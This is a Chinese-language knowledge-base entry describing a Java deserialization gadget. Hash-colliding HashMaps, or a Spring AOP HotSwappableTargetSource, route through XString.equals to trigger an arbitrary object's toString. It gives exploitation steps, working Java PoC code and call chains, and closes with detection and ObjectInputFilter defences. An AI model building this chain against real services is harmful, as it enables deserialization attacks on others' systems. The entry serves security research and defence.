---
id: web-java-deserialization-jdk-xstring-equals-tostring
title: HashMap/HotSwappableTargetSource 配合 XString.equals 触发任意 toString
type: scenario
domain: web
path: web/java/deserialization/jdk
technique: xstring-equals-tostring-trigger
tags:
- java
- deserialization
- gadget
- tostring
- xstring
- hashmap
- spring-aop
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V7
  verified_at: '2026-11-05T00:31:00+08:00'
  notes: 已对照原文核对：XString.equals 对非 XString 对象调用 toString、yy/zZ 哈希碰撞构造 map1/map2、外层 map3 key 哈希相同触发 equals，以及 HotSwappableTargetSource.equals 中转变体均与原文一致；未验证点：原文未附运行日志，属通用 gadget 构造
url: /docs/web/java/deserialization/jdk/web-java-deserialization-jdk-xstring-equals-tostring/
draft: false
kb_aliases:
- XString equals toString
- HashMap XString 链
- HotSwappableTargetSource toString
- Spring AOP toString gadget
- 高版本 toString 触发
---

## 一句话结论

利用 JDK 内部类 `XString.equals` 会调用比较对象 `toString` 的特性，构造哈希冲突的 `HashMap`（或经 Spring AOP `HotSwappableTargetSource` 中转），反序列化 `HashMap` 时即可触发任意对象的 `toString`。

## 原理

- `com.sun.org.apache.xpath.internal.objects.XString` 的 `equals(Object)` 在比较时会把对方转成字符串，内部调用 `obj.toString()`。
- `HashMap.readObject` 会重新 `putVal` 所有键值；当两个 key 的哈希相同且 `equals` 被调用时，进入 `XString.equals`。
- 构造两个 `HashMap`（map1/map2），分别放入 `"yy"` 与 `"zZ"` 等哈希碰撞的键；其中 `"yy"` 对应 `XString`、`"zZ"` 对应恶意对象，使 `XString.equals` 比较到恶意对象。
- 再构造外层 `map3`，把 map1、map2 作为 key 放入，使 map1 与 map2 的哈希相同；反序列化 map3 时触发 map2.equals(map1) → map1 的 `XString.equals(恶意对象)` → `toString`。
- Spring AOP 变体：`HotSwappableTargetSource.equals` 会调用目标的 `equals`，把 `XString` 与恶意对象分别包装后放入 `HashMap`，同样在反序列化时进入 `XString.equals`。

## 触发条件

- 目标可反序列化攻击者可控的 Java 序列化流。
- 存在 `com.sun.org.apache.xpath.internal.objects.XString`（JDK 自带，JDK8/17 均可用）。
- Spring 变体额外需要 `spring-aop`（`HotSwappableTargetSource`）。
- 存在可利用的 `toString` gadget。

## 利用步骤

1. 反射创建 `XString`，把 `m_obj` 设为可控字符串。
2. 构造 map1/map2 的哈希碰撞布局（`"yy"`→XString，`"zZ"`→恶意对象）。
3. 把 map1/map2 作为 key 放入外层 map3（保证两者 hashCode 相同）。
4. 序列化 map3，通过目标反序列化入口发送，触发 `toString`。

## PoC

HashMap + XString：

```java
public static HashMap get_HashMap_XString(Object obj) throws Exception {
    Object xString = Utils.createWithoutConstructor(
        Class.forName("com.sun.org.apache.xpath.internal.objects.XString"));
    Utils.setFieldValue(xString, "m_obj", "");

    HashMap map1 = new HashMap();
    HashMap map2 = new HashMap();
    map1.put("yy", xString);
    map1.put("zZ", obj);
    map2.put("zZ", xString);

    HashMap map3 = new HashMap();
    map3.put(map1, 1);
    map3.put(map2, 2);
    map2.put("yy", obj);
    return map3;
}
```

Spring AOP + HotSwappableTargetSource：

```java
Object xString = Utils.createWithoutConstructor(
    Class.forName("com.sun.org.apache.xpath.internal.objects.XString"));
Utils.setFieldValue(xString, "m_obj", "");

HotSwappableTargetSource h1 = new HotSwappableTargetSource(obj);
HotSwappableTargetSource h2 = new HotSwappableTargetSource(xString);
HashMap map = new HashMap();
map.put(h1, h1);
map.put(h2, h2);
return map;
```

调用链：

```text
HashMap#readObject -> HashMap#putVal -> XString#equals -> obj#toString()
HashMap#readObject -> HotSwappableTargetSource#equals -> XString#equals -> obj#toString()
```

## 变体与关联

- 变体：`HotSwappableTargetSource` 只是中转，核心仍是 `XString.equals`；其他 `equals` 会调用 `toString` 的类也可替换。
- 关联：[[web-java-deserialization-jdk-eventlistenerlist-tostring]]（另一种 toString 触发）；[[web-java-deserialization-jdk-hashtable-textandmnemonic-tostring]]（Hashtable 版本）；[[web-java-deserialization-comparator-rhino]]（Comparator 触发）。
- 边界：JDK 内部类在强封装下仍可通过反射/`createWithoutConstructor` 构造；若目标 JDK 移除了 XString 或过滤该类，链失效。

## 检测与防御

- 检测：反序列化流中出现 `XString`、`HotSwappableTargetSource`、异常哈希碰撞的 HashMap；`toString` gadget 类出现在异常栈。
- 防御：`ObjectInputFilter` 禁止 `com.sun.org.apache.xpath.internal.objects.XString`、`HotSwappableTargetSource` 等类；限制 HashMap 反序列化规模；避免原生 Java 反序列化。
